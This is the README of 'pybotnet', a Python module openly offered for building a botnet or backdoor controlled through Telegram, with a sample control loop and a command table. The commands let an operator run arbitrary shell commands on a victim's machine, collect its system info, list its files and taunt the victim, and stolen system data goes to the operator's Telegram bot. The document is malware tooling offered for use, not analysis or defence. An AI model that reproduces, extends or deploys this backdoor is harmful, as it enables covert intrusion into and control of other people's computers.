# pybotnet  0.1

A module for building botnet or back door with Python and Telegram control panel
- [x] windows
- [x] linux
- [x] mac

### See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to *help* me <3

### Features:
* get command from telegram and execute scripts 
* get command and send message by third party proxy
* get target info 
* sleep source by Optional message
* get ls (dirctory list)

 


### Requirements:

* Python 3.6 or higher.
* Telegram account
* your account number ID (get it from @userinfobot)
* telegram api token (Get it from the telegram botfather)
```
pip install -r requirements.txt
```

### Sample:

```python
import pybotnet
import time

TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
ADMIN_CHAT_ID = '12345678910'
delay = 60

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True, send_system_data=True)

while True:
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)

```

### Commmands:
Send this message to your api bot in telegram, using the admin account.

COMMAND | Sample | DO THIS | Minimum version required |
--------|--------|---------|--------------------------|
do_sleep \<scconds> \<message (Optional)> | do_sleep 99999 hi, i see you! | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 |
get_info | get_info |return system info | 0.06 |
cmd \<system command> | cmd ping google.com | run system command in shell or cmd (Be careful not to give endless command)| 0.07 |
ls \<route (Optional)> | ls C:\ , ls /home |Returns a list of folders and files in that path | 0.09
